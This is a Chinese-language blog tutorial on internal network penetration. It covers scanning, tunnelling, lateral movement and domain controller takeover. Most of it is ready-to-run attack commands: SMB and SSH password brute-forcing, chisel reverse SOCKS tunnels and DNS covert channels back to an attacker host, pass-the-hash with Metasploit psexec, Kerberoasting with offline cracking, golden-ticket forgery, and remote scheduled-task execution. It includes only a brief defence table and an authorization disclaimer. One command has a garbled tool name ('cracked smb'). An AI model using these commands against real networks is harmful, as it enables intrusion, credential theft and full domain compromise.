---
title: 内网渗透实战：从边界突破到内网漫游
slug: kali内网渗透实战从边界到漫游-a1b2c
date: 2026-09-09
visibility: public
tags: Kali Linux, 内网渗透, 横向移动, 域渗透, 网络安全, 教程
---

# 内网渗透实战：从边界突破到内网漫游

外网打点只是渗透的开始。真正高价值的目标——核心数据库、财务系统、域控——都藏在企业内网深处。本教程带你走完内网渗透完整链路：边界突破 → 内网信息收集 → 权限提升 → 横向移动 → 域控接管。

## 一、内网渗透是什么

> "Web渗透是撬开你家大门，内网渗透是进了门之后把整个小区都控制了。"

内网渗透指攻击者（或红队）进入企业内网后，在内网进行的一系列侦察、提权、横向移动、拿下核心资产的操作。

### 完整攻击链路

```
外网打点（拿下一台边界机器）
    ↓
进入内网
    ↓
内网信息收集（摸清拓扑、资产）
    ↓
权限提升（普通权限 → 管理员）
    ↓
横向移动（这台机器 → 其他机器）
    ↓
拿下核心资产（数据库、域控）
```

### 为什么拿下边界只是开始

- 你拿下的边界设备可能只是企业"最外围"的边缘资产，价值不高
- 企业真正值钱的东西（核心库、财务、管理后台）都藏在内网
- 边界突破容易，内网横向移动才是真正考验"内功"的阶段

## 二、内网信息收集

进入内网后的第一件事：**摸清家底**。

### 1. 网络拓扑发现

```bash
# 当前机器网络信息
ipconfig /all        # Windows
ip addr              # Linux
route print          # Windows 路由表
arp -a               # ARP 表（发现内网活跃主机）
netstat -ano         # 网络连接
```

### 2. 存活主机扫描

```bash
# Nmap 内网快速存活扫描
nmap -sn 10.10.10.0/24

# fscan（内网神器，Kali 可自行安装）
fscan -h 10.10.10.0/24

# 端口扫描（内网常用端口）
nmap -sS -T4 --top-ports 1000 10.10.10.0/24

# 特定端口快速扫描
nmap -sS -p 22,80,443,445,3306,3389 10.10.10.0/24
```

### 3. 内网主机信息

```bash
# Windows 查看用户/组
whoami /all
net user
net localgroup administrators
net group "domain admins" /domain

# 查看本机保存的凭据
cmdkey /list
# 共享
net view \\10.10.10.5
# 域信息
nltest /dclist:domain.com
```

### 4. 内网服务漏洞探测

```bash
# SMB 弱口令
crackmapexec smb 10.10.10.0/24 -u admin -p password123
# MS17-010 永恒之蓝
nmap -p 445 --script smb-vuln-ms17-010 10.10.10.0/24
# SSH 弱口令
hydra -l root -P password.txt 10.10.10.0/24 ssh
```

## 三、内网代理与隧道

从外网访问内网，需要通过代理/隧道绕过隔离。

### 1. 建立 SOCKS 代理

```bash
# 工具：frp / chisel / nps / ligolo
# 以 chisel 为例
# 攻击机（server）
chisel server -p 8080 --reverse
# 目标机（client，上传后执行）
chisel client <攻击机IP>:8080 R:socks
# 然后在攻击机使用 proxychains
proxychains nmap -sT -Pn 10.10.10.5
```

### 2. 端口转发

```bash
# 攻击机 8080 → 内网 3389
# 在已控制的边界主机上
ssh -R 8080:10.10.10.5:3389 root@<攻击机IP>

# Meterpreter 端口转发
portfwd add -l 3389 -p 3389 -r 10.10.10.5
```

### 3. DNS/ICMP 隧道（隐蔽通道）

```bash
# dnscat2（DNS 隧道）
# 服务端
ruby dnscat2.rb yourdomain.com
# 客户端（内网）
dnscat2 --dns server=8.8.8.8,port=53 --security open yourdomain.com
```

## 五、横向移动技术

拿到一台机器后，如何跳到同网段其他机器？

### 1. Pass the Hash（哈希传递）

```bash
# 拿到 NTLM 哈希后，无需明文密码直接认证
cracked smb 10.10.10.5 -u admin -H aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Metasploit psexec
use exploit/windows/smb/psexec
set RHOSTS 10.10.10.5
set SMBUser admin
set SMBPass aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
run
```

### 2. 票据攻击（Kerberoasting / Golden Ticket）

```bash
# Kerberoasting：请求服务票据离线爆破
python3 GetUserSPNs.py domain/User:Pass -dc-ip 10.10.10.1 -request
# 离线破解
hashcat -m 13100 krb5tgs.txt password.txt

# 黄金票据：伪造 TGT 完全控制域
# 需要 krbtgt 哈希（域控权限）
python3 ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain target.com Admin
```

### 3. 滥用计划任务 / 服务

```cmd
# 远程执行（需要管理员权限）
schtasks /create /tn "update" /tr "cmd /c whoami > c:\result.txt" /s 10.10.10.5 /u admin /p pass
schtasks /run /s 10.10.10.5 /tn "update"
```

### 4. 内网转发与横向组合拳

```
边界机 → 横向 → 应用服务器 → 横向 → 数据库 → 横移到域控
                     ▲
                     │
                 拿到新凭据后
```

## 六、权限提升与域控接管

### 内网提权

```bash
# 内网提权常用
# 内核漏洞提权
# 服务配置错误
# 密码复用
# 抓取浏览器/本地缓存的密码
```

### 域控接管（Golden Ticket）

```bash
# 拿到域管权限后
# 1. 导出 krbtgt 哈希
# 2. 伪造黄金票据
python3 ticketer.py -nthash <krbtgt> -domain-sid <SID> -domain target.com fakeadmin
# 3. 用票据访问域内任意资源
psexec.py target.com/fakeadmin@DC
```

## 七、防御视角：如何防内网渗透

| 攻击手法 | 防御措施 |
|---------|---------|
| 内网扫描 | 部署内网 HIDS、限制 ICMP 流量 |
| 哈希传递 | 禁止 NTLM 明文认证、启用 Credential Guard |
| Kerberoasting | 强制 Service Account 用复杂密钥，禁止长期免密 |
| 横向移动 | 网络分段、主机加固、最小权限 |
| 域控接管 | 多层防护、监控 TGS 异常、限委派 |

## 八、实战流程建议

```
1. 边界突破后，先用 fscan 扫全网段，定位高价值目标
2. 记录所有开放的端口、服务、口令
3. 优先打 445（SMB）、3389（RDP）、1433（MSSQL）、3306（MySQL）
4. 拿下一台后，用口令复用它去横向
5. 最终目标：拿到域控，才叫完整内网渗透
```

## 安全提醒

> 内网渗透是真实攻击者利用最多的技术栈，涉及横向移动、权限维持等高危操作。请在授权环境（如企业授权的红队演练、合法靶场）中使用。切勿用于非法渗透。

## 小结

- 内网渗透 = 打点 + 信息收集 + 横向移动 + 提权 + 域控
- 隧道是内网漫游的关键工具（chisel / frp / ligolo）
- Pass the Hash / Kerberoasting 是横向移动的核心技术
- 最终目标通常是拿下域控
- 防御要做的：网络分段、最小权限、凭证保护

> 下一篇：免杀技术实战——让恶意载荷绕过杀软与EDR。